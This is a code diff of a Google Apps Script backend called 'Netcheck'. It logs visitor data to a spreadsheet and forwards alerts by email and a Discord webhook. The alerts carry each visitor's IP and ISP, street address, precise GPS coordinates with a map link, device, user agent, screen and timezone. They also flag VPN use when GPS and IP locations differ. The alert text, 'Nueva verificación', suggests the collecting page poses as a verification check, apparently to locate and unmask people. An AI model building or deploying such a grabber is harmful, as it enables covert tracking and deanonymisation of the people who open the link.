@@ -7,8 +7,7 @@
 
 const NOMBRE_HOJA = 'Netcheck';
 const PROP_SHEET = 'SHEET_ID';
-const PROP_TG_TOKEN = 'TG_TOKEN';   // opcional: Script Properties
-const PROP_TG_CHAT = 'TG_CHAT';     // opcional: Script Properties
+const WEBHOOK_DISCORD = ''; // opcional: URL del webhook de Discord
 
 function doGet(e) {
   try {
@@ -35,7 +34,7 @@ function doGet(e) {
         .getDataAsString('UTF-8');
       const datos = JSON.parse(json);
       guardar(datos, sid);
-      avisarTelegram(datos, sid);
+      avisar(datos, sid);
     } else {
       cache.put(key, JSON.stringify(partes), 21600); // 6 h
     }
@@ -75,23 +74,55 @@ function guardar(datos, sid) {
   hoja().appendRow(fila);
 }
 
-function avisarTelegram(datos, sid) {
-  const props = PropertiesService.getScriptProperties();
-  const token = props.getProperty(PROP_TG_TOKEN);
-  const chat = props.getProperty(PROP_TG_CHAT);
-  if (!token || !chat) return;
-  const texto = [
+function resumen(datos) {
+  const lugar = datos.direccion || [datos.ciudad, datos.region, datos.pais].filter(Boolean).join(', ') || '?';
+  const gps = datos.lat != null
+    ? datos.lat.toFixed(5) + ', ' + datos.lon.toFixed(5) +
+      (datos.acc != null ? ' (±' + Math.round(datos.acc) + ' m)' : '') +
+      (datos.maps ? '\nMapa: ' + datos.maps : '')
+    : 'sin GPS';
+  return [
     'Nueva verificación',
-    'IP: ' + (datos.ip || '?'),
-    'Lugar: ' + (datos.direccion || datos.ciudad || '?'),
-    'GPS: ' + (datos.lat != null ? datos.lat.toFixed(5) + ', ' + datos.lon.toFixed(5) + ' (±' + (datos.acc || '?') + ' m)' : 'sin GPS'),
-    'Fuente: ' + (datos.fuente || '?'),
+    '',
+    'IP: ' + (datos.ip || '?') + (datos.isp ? ' (' + datos.isp + ')' : ''),
+    'Lugar: ' + lugar,
+    'GPS: ' + gps,
+    'Fuente: ' + (datos.fuente || '?') + (datos.exacta === 1 ? ' (exacta)' : datos.exacta === 2 ? ' (media)' : ' (aprox IP)'),
+    datos.vpn ? 'Alerta: GPS difiere de la IP >30 km' : '',
+    datos.cgnat ? 'Red: CGNAT' : '',
+    datos.warp && datos.warp !== 'off' ? 'Cloudflare WARP: ' + datos.warp : '',
+    '',
+    'Dispositivo: ' + (datos.plt || '?') + ' | ' + (datos.ua || '').slice(0, 120),
+    'Pantalla: ' + (datos.scr || '?') + ' | TZ: ' + (datos.tz || '?'),
     'Sesion: ' + sid
-  ].join('\n');
-  UrlFetchApp.fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
-    method: 'post',
-    payload: { chat_id: chat, text: texto }
-  });
+  ].filter(l => l !== null).join('\n');
+}
+
+function avisar(datos, sid) {
+  const texto = resumen(datos);
+  avisarEmail(texto, datos);
+  avisarDiscord(texto);
+}
+
+function avisarEmail(texto, datos) {
+  try {
+    const para = Session.getEffectiveUser().getEmail();
+    if (!para) return;
+    const asunto = 'Netcheck: ' + (datos.ip || '?') + ' - ' +
+      (datos.ciudad || datos.pais || 'ubicación');
+    MailApp.sendEmail(para, asunto, texto);
+  } catch (err) {}
+}
+
+function avisarDiscord(texto) {
+  if (!WEBHOOK_DISCORD) return;
+  try {
+    UrlFetchApp.fetch(WEBHOOK_DISCORD, {
+      method: 'post',
+      contentType: 'application/json',
+      payload: JSON.stringify({ content: '```\n' + texto.slice(0, 1900) + '\n```' })
+    });
+  } catch (err) {}
 }
 
 function ok() {
